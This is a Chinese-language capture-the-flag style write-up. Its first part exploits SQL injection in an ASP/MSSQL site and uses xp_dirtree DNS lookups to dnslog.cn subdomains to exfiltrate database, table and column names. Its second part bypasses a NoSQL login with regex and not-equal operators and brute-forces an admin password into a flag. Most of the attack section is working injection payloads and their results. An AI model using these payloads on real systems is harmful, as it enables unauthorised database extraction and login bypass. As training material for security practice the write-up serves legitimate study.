一：获取数据库网站密码

判断注入类型和数据库类型

因为是asp文件所以对应的数据库是mssql数据库

id=1'"\					//存在注入，数字型		

id=1 and 1=1         //页面返回正常
id=1 and 1=0         //页面返回错误

使用dnslong数据外带尝试获取数据

获取当前数据库
declare @a varchar(1024);
set @a='\\'%2Bmaster.dbo.fn_varbintohexstr(CONVERT( varbinary(max), db_name()))%2B'.p5zi3s.dnslog.cn';
exec xp_dirtree @a;				//爆出当前数据库

当前数据库名为22

获取所有数据库
declare @a varchar(1024);
set @a='\\'%2Bmaster.dbo.fn_varbintohexstr(CONVERT( varbinary(max), substring((select top 1 name from master..sysdatabases where name not in (select top 0 name from master..sysdatabases)),1,15)))%2B'.6qwo0k.dnslog.cn';
exec xp_dirtree @a;			//获取第一个数据库
master						//第一个数据库名
model						//第二个数据库
msdb						 //第三个数据库
22    						//当前数据库

查询22数据库下的表
declare @a varchar(1024);
set @a='\\'%2bmaster.dbo.fn_varbintohexstr(CONVERT( varbinary(max), (SELECT top 1 name FROM "22"..sysobjects WHERE xtype=CHAR(85) and name not in (SELECT top 0 name FROM "22"..sysobjects WHERE xtype=CHAR(85)))))%2b'.odwqri.dnslog.cn\xxx';exec xp_dirtree @a;
//依次查询22库下的所有表
sysrscols	        
DB_AnswerAgree		
DB_AnswerFav			
DB_Cart					
DB_Course			
DB_CourseCart			
DB_CourseOrder
查询DB_Course表下的字段
declare @a varchar(1024);
set @a='\\'%2bmaster.dbo.fn_varbintohexstr(CONVERT( varbinary(max), (select top 1 column_name  from information_schema.columns where table_name='DB_Course' and column_name not in (select top 4 column_name from information_schema.columns))))%2b'.rga2fh.dnslog.cn\xxx';
exec xp_dirtree @a;      		//依次查询表下的字段
//字段如下
ID
StyleID

二：nosql注入-扩展

burp抓包

账号使用正则表达式，密码使用&ne逻辑绕过使其恒为真

爆破密码的第一个字母

选取a进行继续爆破

爆出密码的第二个字母，继续爆第三个字母

第三个字母为m,最后依次爆出i,n

用户名为admin

使用正则表达式爆破密码

密码第一个字母为f

依次爆破l,a,g,{,d,j,h,d,-,f,h,e,i,3,-,2,9,i,j,-,9,i,o,k,}

账号：admin
密码：flag{djhd-fhei3-29ij-9iok}

登录成功
